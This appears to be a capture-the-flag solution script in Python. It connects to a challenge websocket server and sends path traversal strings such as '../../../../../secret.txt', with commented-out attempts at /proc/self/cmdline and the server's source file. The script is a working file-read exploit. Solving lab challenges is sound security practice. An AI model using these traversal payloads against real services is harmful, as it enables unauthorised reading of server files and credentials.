#!/usr/bin/env python3

import ast
import websocket

#BASE_URL = 'ws://127.0.0.1:50000'
BASE_URL = 'wss://webstockets.ctfchall.se:50000'

ws = websocket.WebSocket()
ws_url = f'{BASE_URL}/ws/'
print(ws_url)
ws.connect(ws_url)

#ws.send('/feeds/lsoc.json')
#ws.send('../../../../../proc/self/cmdline')
#ws.send('../../../../../home/ctf/app/ws_server.py')

# Solution
ws.send('../../../../../secret.txt')
print(ast.literal_eval(ws.recv()))

# Bug test
#ws.send('../../../../../usr/bin/ls')
#print(ws.recv())
